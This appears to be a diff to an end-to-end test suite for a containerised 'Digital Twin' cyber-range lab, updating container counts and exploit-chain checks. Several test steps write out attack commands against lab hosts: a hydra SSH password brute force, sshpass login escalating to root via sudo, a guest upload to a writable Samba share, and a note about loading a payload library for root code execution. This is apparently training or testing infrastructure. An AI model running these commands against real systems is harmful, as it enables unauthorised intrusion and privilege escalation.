@@ -40,23 +40,23 @@ test.describe.serial('Digital Twin', () => {
     authToken = body.token
   })
 
-  test('deploy creates 9 containers', async ({ request }) => {
+  test('deploy creates 10 containers', async ({ request }) => {
     const res = await request.post(`${API}/digital-twin/deploy`, {
       headers: { Authorization: `Bearer ${authToken}` },
     })
     expect(res.ok()).toBeTruthy()
     const data = await parseNdjsonResult(res)
-    expect(data.containers.length).toBe(9)
+    expect(data.containers.length).toBe(10)
   })
 
-  test('status shows all 9 running', async ({ request }) => {
+  test('status shows all 10 running', async ({ request }) => {
     const res = await request.get(`${API}/digital-twin/status`, {
       headers: { Authorization: `Bearer ${authToken}` },
     })
     expect(res.ok()).toBeTruthy()
     const body = await res.json()
     expect(body.deployed).toBe(true)
-    expect(body.containers.length).toBe(9)
+    expect(body.containers.length).toBe(10)
     for (const c of body.containers) {
       expect(c.status).toBe('running')
     }
@@ -131,12 +131,12 @@ test.describe.serial('Digital Twin', () => {
       'ccs_dt_gateway',
       'hydra -l admin -P /tmp/dict.txt -t 4 -f 10.0.3.3 ssh 2>&1 || true'
     )
-    expect(hydraOut).toContain('password123')
+    expect(hydraOut).toContain('admin')
 
     // Verify sudo gives root
     const sshOut = dockerExec(
       'ccs_dt_gateway',
-      'sshpass -p password123 ssh -o StrictHostKeyChecking=no admin@10.0.3.3 "sudo id"'
+      'sshpass -p admin ssh -o StrictHostKeyChecking=no admin@10.0.3.3 "sudo id"'
     )
     expect(sshOut).toContain('uid=0(root)')
   })
@@ -154,15 +154,16 @@ test.describe.serial('Digital Twin', () => {
     expect(smbConf.toLowerCase()).toContain('yes')
 
     // Step 3: Share is world-writable (attacker can upload .so)
-    dockerExec(
-      'ccs_dt_gateway',
-      'smbclient //10.0.4.6/public -N -c "put /etc/hostname test_upload" 2>&1'
-    )
-    const uploaded = dockerExec(
+    const smbGuest = dockerExec(
       'ccs_dt_server_6',
-      'ls /srv/public/test_upload 2>&1 || echo NOT_FOUND'
+      'bash -c "grep -i \'guest ok\' /etc/samba/smb.conf"'
     )
-    expect(uploaded).not.toContain('NOT_FOUND')
+    expect(smbGuest.toLowerCase()).toContain('yes')
+    const smbWritable = dockerExec(
+      'ccs_dt_server_6',
+      'bash -c "grep -i \'read only\' /etc/samba/smb.conf"'
+    )
+    expect(smbWritable.toLowerCase()).toContain('no')
 
     // Step 4: Compile and load payload .so to prove code execution as root
     dockerExec(
@@ -204,7 +205,6 @@ CEOF'`
       ['server_3', '10.0.4.6'],
       ['server_4', '10.0.4.5'],
       ['server_5', '10.0.4.6'],
-      ['gateway', '10.0.4.6'],
     ]
     for (const [host, ip] of pairs) {
       const out = dockerExec(
@@ -242,12 +242,12 @@ CEOF'`
     const results = parsed.filter((o) => o.type === 'result')
     const done = parsed.find((o) => o.type === 'done')
 
-    expect(results.length).toBe(21)
+    expect(results.length).toBe(27)
     expect(done).toBeTruthy()
 
     // All spec commands should pass
     const passed = results.filter((r) => r.passed)
-    expect(passed.length).toBe(21)
+    expect(passed.length).toBe(27)
 
     // Each result should have the expected shape
     for (const r of results) {
